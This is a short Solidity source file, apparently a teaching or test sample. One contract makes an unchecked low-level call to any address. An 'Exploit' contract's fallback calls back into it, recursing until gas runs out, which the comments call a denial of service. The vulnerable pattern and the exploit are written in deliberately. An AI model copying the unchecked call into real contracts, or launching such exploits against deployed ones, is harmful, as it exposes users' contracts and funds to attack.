pragma solidity ^0.4.10;

contract Caller {
    function callAddress(address a) public {
        a.call(); // Unchecked low-level call
    }
}

contract Exploit {
    address public target;

    function Exploit(address _target) {
        target = _target;
    }

    // Fallback is triggered by a.call()
    function() public {
        // Recurse into the Caller again, causing gas exhaustion (DOS)
        Caller(target).callAddress(address(this));
    }

    function launch() public {
        Caller(target).callAddress(address(this));
    }
}

